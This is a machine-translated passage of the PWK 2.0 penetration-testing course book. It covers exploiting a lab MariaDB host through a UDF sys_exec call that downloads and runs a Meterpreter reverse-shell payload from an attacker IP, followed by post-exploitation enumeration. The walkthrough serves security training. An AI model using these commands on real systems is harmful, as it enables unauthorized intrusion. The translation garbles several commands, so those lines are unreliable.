<div style="position:absolute;top:210484;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:211561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:211561;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:211561;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">795</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以在 Zora 上上传并执行一个 Meterpreter 有效负载以发送一个反向 shell</font></font></nobr></div>
<div style="position:absolute;top:210599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到我们的 Kali 实例。</font><font style="vertical-align: inherit;">我们不必生成新的meterpreter shell，因为我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:210618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们用于 Ajla 的相同。</font><font style="vertical-align: inherit;">由于我们现在通过标准 ssh 连接到 Ajla</font></font></nobr></div>
<div style="position:absolute;top:210638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接，我们可以使用 Kali 上的端口 443 进行 Zora meterpreter 会话。</font><font style="vertical-align: inherit;">首先，让我们指导佐拉</font></font></nobr></div>
<div style="position:absolute;top:210657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载二进制有效负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('wget http://10.11.0.4/shell.elf');</font></font></font></b></nobr></div>
<div style="position:absolute;top:210709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">sys_exec('wget http://10.11.0.4/shell.elf') |</font></font></nobr></div>
<div style="position:absolute;top:210743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:210760;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 |</font></font></nobr></div>
<div style="position:absolute;top:210777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 排（0.260 秒）</font></font></nobr></div>
<div style="position:absolute;top:210813;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 943 - 通过 UDF 下载 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载meterpreter后，我们需要使文件可执行。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('chmod +x ./shell.elf');</font></font></font></b></nobr></div>
<div style="position:absolute;top:210895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">sys_exec('chmod +x ./shell.elf') |</font></font></nobr></div>
<div style="position:absolute;top:210928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:210945;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 |</font></font></nobr></div>
<div style="position:absolute;top:210962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+---------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 行（0.074 秒）</font></font></nobr></div>
<div style="position:absolute;top:210999;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 944 - 使 meterpreter shell 可执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在 shell 是可执行的，让我们在 Kali 上重新启动 msfconsole 以获得一个全新的环境。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:211080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q -x "使用exploit/multi/handler;\</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:211097;left:214"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD linux/x86/meterpreter/reverse_tcp;\</font></font></b></nobr></div>
<div style="position:absolute;top:211114;left:214"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4;\</font></font></b></nobr></div>
<div style="position:absolute;top:211131;left:214"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 443;\</font></font></b></nobr></div>
<div style="position:absolute;top:211148;left:214"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:211182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:443 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:211201;left:271"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 945 - 启动 msfconsole 以捕获 UDF 反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置并运行我们的侦听器后，我们可以在 Zora 上执行 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('./shell.elf');</font></font></font></b></nobr></div>
<div style="position:absolute;top:211284;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 946 - 运行 Shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以回到 msfconsole 并检查我们是否捕获了 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:443 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:211366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（985320 字节）到 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:211383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 1 在 18:00:32 打开 (10.11.0.4:443 -&gt; 10.11.1.250:27904)</font></font></nobr></div>
<div style="position:absolute;top:211417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:211434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 3972 已创建。</font></font></nobr></div>
<div style="position:absolute;top:211451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:211485;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:211639;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="179"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 179 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:211672;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:212749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:212749;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:212749;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">796</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:211768;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 947 - 捕获 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">太好了，我们在 Zora 上有一个可用的非特权 shell！</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:211831;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、修改原Python漏洞利用，捕获反向shell。</font></font></nobr></div>
<div style="position:absolute;top:211890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 最初的 UDF 漏洞被宣传为提权漏洞。</font><font style="vertical-align: inherit;">为什么我们得到一个</font></font></nobr></div>
<div style="position:absolute;top:211909;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无特权的外壳？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:211944;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.2</font></font></i></nobr></div>
<div style="position:absolute;top:211944;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:211982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们在 Zora 上有了一个 shell，让我们收集一些关于主机的一般信息，看看有什么</font></font></nobr></div>
<div style="position:absolute;top:212001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以学习。</font><font style="vertical-align: inherit;">让我们首先检查正在运行的 Linux 的风格。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:212036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:212053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 4469 已创建。</font></font></nobr></div>
<div style="position:absolute;top:212070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 2 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:212104;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 /etc/issue</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:212121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎使用 Alpine Linux 3.10</font></font></nobr></div>
<div style="position:absolute;top:212138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\m (\l) 上的内核 \r</font></font></nobr></div>
<div style="position:absolute;top:212157;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 948 - 查看 /etc/issue</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谷歌快速搜索向我们展示了 Alpine Linux 是“一个面向安全的轻量级 Linux</font></font></nobr></div>
<div style="position:absolute;top:212206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 musl libc 和 busybox 的发行版”。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">738</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是我们可以期待这个有用的信息</font></font></nobr></div>
<div style="position:absolute;top:212225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有运行很多服务或应用程序的操作系统。</font><font style="vertical-align: inherit;">任何不寻常的事情都可能是</font></font></nobr></div>
<div style="position:absolute;top:212244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好目标。</font><font style="vertical-align: inherit;">让我们继续收集信息。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:212279;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫/过程/版本</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:212296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 版本 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc 版本 8.3.0 (Alpine</font></font></nobr></div>
<div style="position:absolute;top:212313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019</font></font></nobr></div>
<div style="position:absolute;top:212332;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 949 - 查找内核版本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/proc/version 文件告诉我们发行版是在 2019 年 10 月构建的。除此之外，我们可以</font></font></nobr></div>
<div style="position:absolute;top:212381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记下内核版本并继续前进。</font></font></nobr></div>
<div style="position:absolute;top:212414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来看看环境变量。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:212449;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:212466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户=mysql</font></font></nobr></div>
<div style="position:absolute;top:212483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHLVL=1</font></font></nobr></div>
<div style="position:absolute;top:212500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家=/var/lib/mysql</font></font></nobr></div>
<div style="position:absolute;top:212517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/loca</font></font></nobr></div>
<div style="position:absolute;top:212534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">l/games:/system/bin:/system/sbin:/system/xbin</font></font></nobr></div>
<div style="position:absolute;top:212551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">朗=C</font></font></nobr></div>
<div style="position:absolute;top:212568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWD=/var/lib/mysql</font></font></nobr></div>
<div style="position:absolute;top:212587;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 950 - 查找环境变量</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:212699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">738 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Alpine Linux 开发团队，2020），https://alpinelinux.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:212827;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="180"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 180 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:212860;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:213937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:213937;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:213937;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">797</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:212956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，环境变量并没有告诉我们太多。</font><font style="vertical-align: inherit;">还</font><font style="vertical-align: inherit;">查看</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps aux</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的输出</font></font></nobr></div>
<div style="position:absolute;top:212975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有透露任何关于我们可以利用的有用信息。</font><font style="vertical-align: inherit;">让我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看看我们是否</font></font></nobr></div>
<div style="position:absolute;top:212995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以访问任何未从沙盒外部网络公开的新端口。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213029;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -tulpn</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:213046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat：仅显示具有您的用户 ID 的进程</font></font></nobr></div>
<div style="position:absolute;top:213064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动 Internet 连接（仅限服务器）</font></font></nobr></div>
<div style="position:absolute;top:213080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proto Recv-Q Send-Q 本地地址外地址状态PID/程序名称    </font></font></nobr></div>
<div style="position:absolute;top:213097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:213097;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:22 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:213097;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -</font></font></nobr></div>
<div style="position:absolute;top:213114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:213114;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:3306 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:213114;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -</font></font></nobr></div>
<div style="position:absolute;top:213131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:213131;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 :::22    </font></font></nobr></div>
<div style="position:absolute;top:213131;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:213131;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -</font></font></nobr></div>
<div style="position:absolute;top:213148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP    </font></font></nobr></div>
<div style="position:absolute;top:213148;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 127.0.0.1:323 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:213148;left:627"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——</font></font></nobr></div>
<div style="position:absolute;top:213165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP    </font></font></nobr></div>
<div style="position:absolute;top:213165;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 :: 1:323    </font></font></nobr></div>
<div style="position:absolute;top:213165;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:213165;left:627"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——</font></font></nobr></div>
<div style="position:absolute;top:213185;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 951 - 查看开放端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:213214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与正在运行的服务类似，开放端口不会为我们提供任何新信息。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:213233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查文件系统的样子。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213268;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 /etc/fstab</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:213285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UUID=ede2f74e-f23a-441c-b9cb-156494837ef3 / ext4 rw,relatime 0 1</font></font></nobr></div>
<div style="position:absolute;top:213302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UUID=8e53ca17-9437-4f54-953c-0093ce5066f2 /boot ext4 rw,relatime 0 2</font></font></nobr></div>
<div style="position:absolute;top:213319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UUID=ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046 交换默认值    </font></font></nobr></div>
<div style="position:absolute;top:213319;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0</font></font></nobr></div>
<div style="position:absolute;top:213336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/cdrom /media/cdrom iso9660 noauto,ro 0 0</font></font></nobr></div>
<div style="position:absolute;top:213353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/dev/usbdisk /media/usb vfat noauto 0 0</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:213370;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">//10.5.5.20/Scripts /mnt/scripts cifs uid=0,gid=0,username=,password=,_netdev 0 0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:213389;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 952 - 检查挂载的共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:213419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/fstab 的内容很有趣。</font><font style="vertical-align: inherit;">从 10.5.5.20 主机装载共享。</font><font style="vertical-align: inherit;">让我们戳</font></font></nobr></div>
<div style="position:absolute;top:213438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">围绕脚本分享，看看我们发现了什么。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213473;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /mnt/脚本</font></font></b></nobr></div>
<div style="position:absolute;top:213490;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:213507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nas_setup.yml</font></font></nobr></div>
<div style="position:absolute;top:213524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旧用户查找.ps1</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:213541;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">system_report.ps1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:213558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">temp_folder_cleanup.bat</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:213592;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat system_report.ps1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
